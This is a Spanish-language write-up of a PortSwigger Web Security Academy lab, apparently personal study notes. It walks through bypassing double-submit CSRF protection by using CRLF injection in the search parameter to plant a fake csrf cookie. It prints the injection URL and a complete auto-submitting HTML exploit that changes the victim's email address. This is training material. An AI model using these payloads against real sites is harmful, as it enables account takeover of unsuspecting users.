`TAREA:`
Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: `wiener:peter`

como siempre iniciamos sesión en el lab con las credenciales que nos proporcionan e interceptamos la solicitud para luego enviarla al repeater
![[Pasted image 20250710162852.png]]

después de interceptar la solicitud la enviamos al repeater y podemos tirar (Drop) la intercepción para no realizar ningún cambio 

podemos ver que tenemos tanto la `cookie` de inicio de sesión como el `csrf`
![[Pasted image 20250710163229.png]]

ahora realizamos una búsqueda y analizamos la solicitud para identificar sus parámetros
![[Pasted image 20250710163311.png]]

una ves tenemos la solicitud la enviamos al repeater para analizar la respuesta del lado del servidor. en este caso tenemos una respuesta `200 OK` y nos devuelve el parámetro `Set-cookie: LastSearchTerm` esta cookie contiene el parámetro de nuestra ultima búsqueda es decir `test` así que vamos a validar esto y si no cumple con la validación correcta podemos explotar esta vulnerabilidad y generar una cabecera dinámica que contenga el parámetro `Set-cookie`
![[Pasted image 20250710163437.png]]

realizamos la validación correspondiente y efectivamente obtenemos una respuesta `200 OK` donde el parámetro `Set-Cookie` contiene el valor `csrf:test`

la inyección del encabezado nos quedaría así:
```python
GET /?search=test%0d%0aSet-Cookie:%20csrf=test HTTP/2
```

por ejemplo también podrías crea una URL que use esta vulnerabilidad para inyectar una URL falsa. `csrf`cookie en el navegador de la víctima.

```python
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

![[Pasted image 20250710164155.png]]

ahora lo que tenemos que hacer es ir a la solicitud que contiene nuestra función de actualización de correo electrónico y vamos a generar un CSRF PoC 
![[Pasted image 20250710164512.png]]

primero vamos e eliminar la función de las etiquetas `<script>` para poder hacer uso de nuestra inyección 
![[Pasted image 20250710164700.png]]

ahora solo nos queda inyectar una fuente de imagen que haga un llamado a la url que será la web + el encabezado que hemos construido. nos quedaría algo así: 

```python
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aac003e046af89e81ef842e00ce003f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="t7TLNlTl0JbLuxmo3xN0Gn3XxKZpwwfz" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0aac003e046af89e81ef842e00ce003f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

donde
```python
<img src="https://0aac003e046af89e81ef842e00ce003f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```
seria nuestra inyección completa y maliciosa

`NOTA: Recuerda camviar tu valor de csrf token. por el valor de LastSearchTerm en mi caso es -test-  ` 
![[Pasted image 20250710165217.png]]


![[Pasted image 20250710170300.png]]